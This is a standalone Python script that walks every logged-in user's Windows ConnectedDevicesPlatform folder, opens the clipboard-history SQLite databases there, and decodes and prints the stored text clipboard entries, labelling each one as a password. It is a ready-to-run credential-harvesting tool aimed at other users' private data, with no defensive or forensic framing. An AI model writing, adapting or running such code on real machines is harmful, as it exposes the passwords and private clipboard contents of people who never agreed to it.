import os
import psutil
import sqlite3
import json
import base64


def get_user_profiles() -> dict:
    """
    Returns a dictionary containing user profiles of ConnectedDevicesPlatform folder
    """
    users = [user.name for user in psutil.users()]
    profiles = {}
    for user in users:
        profile_folder_name = []
        folder_path = os.path.join('C:\\Users', user, 'AppData', 'Local', 'ConnectedDevicesPlatform')
        if os.path.exists(folder_path):
            items = os.listdir(folder_path)
            num_dirs = 0
            for item in items:
                item_path = os.path.join(folder_path, item)
                if os.path.isdir(item_path):
                    subfolder_path = os.path.join(item_path)
                    subitems = os.listdir(subfolder_path)

                    for subitem in subitems:
                        if subitem.endswith(".db"):
                            profile_folder_name.append(os.path.join(item_path, subitem))
                            num_dirs += 1

            if len(profile_folder_name) > 0:
                profiles[user] = profile_folder_name
            print(f'{user}: Found {num_dirs} directories in ConnectedDevicesPlatform folder')
        else:
            print(f'{user}: ConnectedDevicesPlatform folder not found')

    return profiles


def get_clipboard_data():
    """
    Extracts clipboard data from ConnectedDevicesPlatform folders
    """
    profiles = get_user_profiles()

    if len(profiles) == 0:
        return

    for user, profile_folder_names in profiles.items():
        for profile_folder_name in profile_folder_names:
            with sqlite3.connect(profile_folder_name) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT ClipboardPayload FROM ActivityOperation WHERE ClipboardPayload IS NOT NULL")
                results = c.fetchall()
                for row in results:
                    data = json.loads(row[0])
                    if data[0]["formatName"] == "Text":
                        try:
                            decoded_data = base64.b64decode(data[0]["content"]).decode('utf-8')
                        except Exception as e:
                            print(f"{user}: Error decoding base64 data. {e}")
                            continue
                        print(f'{user}: Password from ClipboardPayload: {decoded_data}')


if __name__ == "__main__":
    get_clipboard_data()
